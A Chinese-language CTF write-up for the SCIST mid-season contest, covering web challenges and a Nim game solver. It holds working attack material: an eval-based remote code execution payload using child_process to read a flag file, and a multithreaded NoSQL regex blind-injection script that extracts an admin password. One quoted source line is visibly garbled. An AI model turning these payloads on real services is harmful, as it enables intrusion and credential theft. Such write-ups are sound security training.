title: SCIST 資安季中賽write up
date: 2025-2-18 17:49:32
tags: CTF
---

# SCIST 資安季中賽write up

## Welcome

### Real welcome:
題目：
此次季中賽 Flag 格式均為：SCIST{.*}

SCIST{Hello_World_From_SCIST}

> Flag: SCIST{Hello_World_From_SCIST}

### CATCH THE FLAG!
題目：
嗨你好我是 OsGa
預祝各位季中賽順利，我和 Fearnot 去打 EOF 了
記得要乖乖不要壞壞ㄡ
FLAG 被我放在首頁的一個的地方，快去找找看ㄅ

第一段flag放在首頁的console裡
![image](https://hackmd.io/_uploads/S12n1ArYyx.png)
接著去找第二段 看了提示放在robots.txt裡
![image](https://hackmd.io/_uploads/rJHJgRrF1g.png)
看到這個頁面
進到
```
https://mid.ctf.scist.org/cnZjdmN2Y3ZfYWd2Yl9kaV9jem16Cg==
```
看到
![image](https://hackmd.io/_uploads/ByfmlArtyl.png)
因為按鈕會一直跑 所以我直接
```
view-source:https://mid.ctf.scist.org/cnZjdmN2Y3ZfYWd2Yl9kaV9jem16Cg==
```
找到第二段flag
> Flag: SCIST{c0Ns01E.1O9_w3lc0mE}

## Web

### Da Vinci Code online 🛜

source:
```javascript
class GameRoom {
	constructor() {
		this.answer = Math.floor(Math.random() * 10001);
		this.attempts = 0;
		this.maxAttempts = 3;
		this.isGameOver = false;
	}

	guess(number) {
		if (this.isGameOver || this.attempts >= this.maxAttempts) {
			return { status: 'error', message: 'Game Over!' };
		}

		this.attempts++;
		const guess = parseInt(number);

		if (isNaN(guess) || guess < 0 || guess > 10000) {
			return { status: 'error', message: 'Invalid number! Please enter a number between 0-10000.' };
		}

		if (guess === this.answer) {
			this.isGameOver = true;
			return {
				status: 'win',
				message: `Congratulations! The answer is ${this.answer}`,
				flag: process.env.FLAG
			};
		}

		if (this.attempts >= this.maxAttempts) {
			this.isGameOver = true;
			return {
				status: 'lose',
				message: `Game Over! You've used all ${this.maxAttempts} attempts. The answer was ${this.answer}`
			};
		}

		return {
			status: 'continue',
			message: `Wrong! The number is ${guess < this.answer ? 'bigger' : 'smaller'}. ${this.maxAttempts - this.attempts} attempts remaining.`
		};
	}

	getSecretAnswer(commanE.1O9_w3lc0mE}d) {
		if (command === 'SHOW_ME_THE_ANSWER_PLZ') {
			return { status: 'secret', answer: this.answer };
		}
		return { status: 'error', message: 'Invalid command' };
	}
}

module.exports = GameRoom;
```
```javascript
const WebSocket = require('ws');
const GameRoom = require('./gameRoom');

const wss = new WebSocket.Server({ port: 8080 });
const rooms = new Map();

const ROOM_TIMEOUT = 30 * 60 * 1000;
const CLEANUP_INTERVAL = 5 * 60 * 1000;

function cleanupRooms() {
	const now = Date.now();
	for (const [roomId, room] of rooms.entries()) {
		if (now - room.lastActivity > ROOM_TIMEOUT ||
			room.ws.readyState === WebSocket.CLOSED) {
			rooms.delete(roomId);
			console.log(`Cleaned up room: ${roomId}`);
		}
	}
}

setInterval(cleanupRooms, CLEANUP_INTERVAL);

wss.on('connection', (ws) => {
	const roomId = Date.now().toString();
	const gameRoom = new GameRoom();

	rooms.set(roomId, {
		ws,
		gameRoom,
		lastActivity: Date.now()
	});

	console.log(`New connection established: ${roomId}`);

	ws.send(JSON.stringify({
		status: 'connected',
		message: `Welcome! Room ID: ${roomId}. You have 3 attempts to guess a number between 0-10000.`
	}));

	ws.on('message', (message) => {
		const room = rooms.get(roomId);
		if (!room) return;

		room.lastActivity = Date.now();

		try {
			const data = JSON.parse(message);
			let response;

			if (data.type === 'guess') {
				response = room.gameRoom.guess(data.number);
			} else if (data.type === 'backdoor') {
				response = room.gameRoom.getSecretAnswer(data.command);
			} else {
				response = { status: 'error', message: 'Invalid message type' };
			}

			ws.send(JSON.stringify(response));

			if (response.status === 'win' || response.status === 'lose') {
				room.lastActivity = Date.now() - (ROOM_TIMEOUT - 5 * 60 * 1000);
			}
		} catch (error) {
			ws.send(JSON.stringify({
				status: 'error',
				message: 'Invalid message format'
			}));
		}
	});

	ws.on('close', () => {
		rooms.delete(roomId);
		console.log(`Connection closed: ${roomId}`);
	});

	const pingInterval = setInterval(() => {
		if (ws.readyState === WebSocket.OPEN) {
			ws.ping();
		} else {
			clearInterval(pingInterval);
		}
	}, 30000);
});

console.log('WebSocket server is running on port 8080');
```

我發現他傳過去的資料是json的格式且type有個東西叫backdoor，
以及輸入SHOW_ME_THE_ANSWER_PLZ
會給答案，於是開啟我們的好朋友burp

![image](https://hackmd.io/_uploads/BJjIX0BYkl.png)
把這個改成
![image](https://hackmd.io/_uploads/SkytQRSFyl.png)
得到正確答案
![image](https://hackmd.io/_uploads/B1497RHF1l.png)
輸入進去flag出來了
>FLAG: SCIST{WC_5c1St_Sc0r3bo4rD_1s5u3}


### calculator:
題目：
應該比 Welcome 簡單吧？？？
好有跟沒有一樣
看source:

```javascript 
import React, { useState, useEffect } from 'react';

function App() {
  const [ws, setWs] = useState(null);
  const [expression, setExpression] = useState('');
  const [response, setResponse] = useState('');

  useEffect(() => {
    const socket = new WebSocket(ws://${window.location.hostname}:${window.location.port});
    socket.onopen = () => {
      console.log("WebSocket 已連線");
    };
    socket.onmessage = (event) => {
      setResponse(event.data);
    };
    socket.onerror = (error) => {
      console.error("WebSocket 發生錯誤", error);
    };
    setWs(socket);
    return () => {
      socket.close();
    };
  }, []);

  const handleCalculate = () => {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(expression);
    }
  };

  const handleButtonClick = (value) => {
    if (value === '=') {
      handleCalculate();
    } else if (value === 'C') {
      setExpression('');
      setResponse('');
    } else if (value === '←') {
      setExpression(prev => prev.slice(0, -1));
    } else {
      setExpression(prev => prev + value);
    }
  };

  const buttons = [
    ['(', ')', 'C', '←'],
    ['7', '8', '9', '/'],
    ['4', '5', '6', '*'],
    ['1', '2', '3', '-'],
    ['0', '.', '=', '+']
  ];

  return (
    <div style={{ 
      margin: '40px', 
      fontFamily: 'Arial, sans-serif',
      maxWidth: '400px',
      margin: '40px auto'
    }}>
      <h1>計算機</h1>
      <div style={{
        marginBottom: '20px'
      }}>
        <input
          type="text"
          value={expression}
          onChange={(e) => setExpression(e.target.value)}
          placeholder="例如：2+3"
          style={{ 
            width: '100%', 
            height: '30px', 
            fontSize: '16px',
            marginBottom: '10px',
            padding: '5px'
          }}
        />
        <div style={{ 
          marginTop: '10px', 
          padding: '10px', 
          backgroundColor: '#f7f7f7',
          borderRadius: '4px'
        }}>
          結果： {response}
        </div>
      </div>

      <div style={{
        display: 'grid',
        gridTemplateColumns: 'repeat(4, 1fr)',
        gap: '8px'
      }}>
        {buttons.map((row, i) => (
          row.map((btn, j) => (
            <button
              key={${i}-${j}}
              onClick={() => handleButtonClick(btn)}
              style={{
                padding: '12px',
                fontSize: '18px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                backgroundColor: ['C', '←', '='].includes(btn) ? '#ff4444' : 
                               ['+', '-', '*', '/', '(', ')'].includes(btn) ? '#e0e0e0' : 
                               'white',
                color: ['C', '←', '='].includes(btn) ? 'white' : 'black',
                cursor: 'pointer'
              }}
            >
              {btn}
            </button>
          ))
        ))}
      </div>
    </div>
  );
}

export default App;
```

```javascript 
const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const app = express();

app.use(express.static(path.join(__dirname, 'build')));

app.get('*', (res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws) => {
  ws.on('message', (message) => {
    console.log('Received:', message);
    try {
      let result = eval('(' + message + ')');
      ws.send(result);
    } catch (e) {
      ws.send(e.message);
    }
  });
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(Server listening on http://localhost:${PORT});
});

```
發現了eval()這東東
可以執行RCE

payload:
```
process.mainModule.require('child_process').execSync('cat /flag_3298fh9u32niaergjfwe9ij923.txt').toString()
```
>Flag: SCIST{TRy_70_dO_5Om3_C@1cU1A7Or}


### nosql injection blind2
題目：
跟 lab 的 nosql injection blind 一樣，不過這次的字元更廣！
flag format: SCIST{[\u0001-\uFFFF]+}

看code: 
```python
from flask import Flask, request, jsonify, render_template, send_file
from pymongo import MongoClient
from base64 import b64encode
from config import mongo_username, mongo_password, flag
import os

app = Flask(__name__)
client = MongoClient(
    f"mongodb://{mongo_username}:{mongo_password}@mongo:27017", connect=False
)
db = client["nosqlinjectionblind"]


@app.route("/login", methods=["POST"])
def login():
    users = db.users
    username = request.json.get("username")
    password = request.json.get("password")
    print(password, flush=True)

    user = users.find_one({"username": username, "password": password})

    if user:
        return jsonify(
            {
                "message": "Login successful",
            }
        )
    else:
        return jsonify({"error": "Invalid credentials"}), 401


@app.route("/")
def index():
    if request.args.get("debug"):
        return send_file(__name__ + ".py")
    return render_template("index.html")


@app.before_first_request
def initialize_database():
    users = db.users

    # Insert default users
    guest_user = {"username": "guest", "password": "guest"}
    users.update_one({"username": "guest"}, {"$set": guest_user}, upsert=True)

    # Insert secret user
    secret_user = {"username": "admin", "password": flag}
    users.update_one({"username": "admin"}, {"$set": secret_user}, upsert=True)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```
知道是nosql injection後先串最簡單的payload
```
{
    username: "admin",
    password: {"$ne": null}
}
```
發現可以Login
但仔細看code發現flag就是password於是要把password炸出來

我的exploit:
```python
import requests
import re
from concurrent.futures import ThreadPoolExecutor
from typing import Optional
import time

class FlagFinder:
    def __init__(self, url: str, initial_flag: str = "SCIST{", max_workers: int = 10):
        self.url = url
        self.current_flag = initial_flag
        self.max_workers = max_workers
        self.found_char: Optional[str] = None
        self.charset = ''.join(chr(i) for i in range(1, 0x10000))
        
    def test_char(self, char: str) -> bool:
        """Test a single character against the API"""
        try:
            escaped_char = re.escape(char)
            payload = {
                "username": "admin",
                "password": {"$regex": f"^{self.current_flag}{escaped_char}"}
            }
            
            response = requests.post(self.url, json=payload, timeout=5)
            return "Login successful" in response.text
        except Exception as e:
            print(f"Error testing character {char}: {str(e)}")
            return False

    def find_next_char(self, chunk: str) -> None:
        """Search through a chunk of characters to find the next valid one"""
        if self.found_char is not None:
            return
            
        for char in chunk:
            if self.found_char is not None:
                break
                
            if self.test_char(char):
                self.found_char = char
                break

    def find_flag(self) -> str:
        """Main method to find the complete flag using multiple threads"""
        print(f"Starting with initial flag: {self.current_flag}")
        
        while True:
            self.found_char = None
            chunk_size = len(self.charset) // self.max_workers
            chunks = [self.charset[i:i + chunk_size] for i in range(0, len(self.charset), chunk_size)]
            
            start_time = time.time()
            
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                executor.map(self.find_next_char, chunks)
            
            if self.found_char is None:
                print(f"\nComplete flag found: {self.current_flag}")
                return self.current_flag
            
            self.current_flag += self.found_char
            elapsed_time = time.time() - start_time
            print(f"Found char: {self.found_char} | Current flag: {self.current_flag} | Time: {elapsed_time:.2f}s")

def main():
    url = "http://lab.scist.org:31601/login"
    finder = FlagFinder(url, max_workers=100)
    final_flag = finder.find_flag()
    print(f"Final flag: {final_flag}")

if __name__ == "__main__":
    main()
```
btw 原本單線程去炸炸了12hr還沒炸出來 用多線程幾分鐘就炸好了XDD

> Flag: SCIST{WOW_y0u_4r3_7h3_ＢＬＩＮＤ}

## Misc
### Trick or Treat
題目：無
經典的Nim問題 但要先手必勝
我的exploit:

```python 
from pwn import *
from functools import reduce
import operator

r = remote("lab.scist.org", 31418)
r.recvlines(5)

while True:
    get = r.recvline().decode().strip().split()
    
    # 確保 `get` 足夠長才處理
    if len(get) < 6:
        print("Received unexpected input:", get)
        continue  # 跳過這次迴圈，避免 IndexError
    
    box = [int(get[i].replace(",", "")) for i in range(6, len(get) - 1)]
    
    while True:
        nim = reduce(operator.xor, box)
        move_made = False
        
        for i in range(len(box)):
            take_amount = box[i] - (box[i] ^ nim)
            if take_amount > 0:
                r.sendline(f"({i + 1},{take_amount})".encode())
                box[i] -= take_amount
                move_made = True
                break  # 一次只能取一堆糖果，所以跳出迴圈

        if not move_made:
            print("No valid move found, exiting.")
            break  # 防止無限迴圈
        
        for _ in range(2):
            get = r.recvline().decode().strip().split()
            
            # 處理「Wrong input.」情況，避免 `IndexError`
            if get[0] == "Wrong":
                print("Received wrong input, retrying...")
                continue  # 直接跳過，不繼續執行後續邏輯
            
            if len(get) < 9:
                print("Unexpected response:", get)
                continue  # 確保 `get[3]` 和 `get[8]` 存在
            
            if get[1] == "succeeded.":
                break  # 對方成功移動，跳出迴圈
            
            print(get)

            try:
                ai_get = int(get[3])  # AI 取走的數量
                ai_box = int(get[8][:-1])  # AI 取走的盒子，去掉句點
                box[ai_box - 1] -= ai_get
            except (ValueError, IndexError) as e:
                print(f"Error parsing AI move: {e}, data: {get}")
                continue

    a = r.recvline()
    print(a)
```

> Flag: SCIST{trick-or-treat? trick-xor-treat!}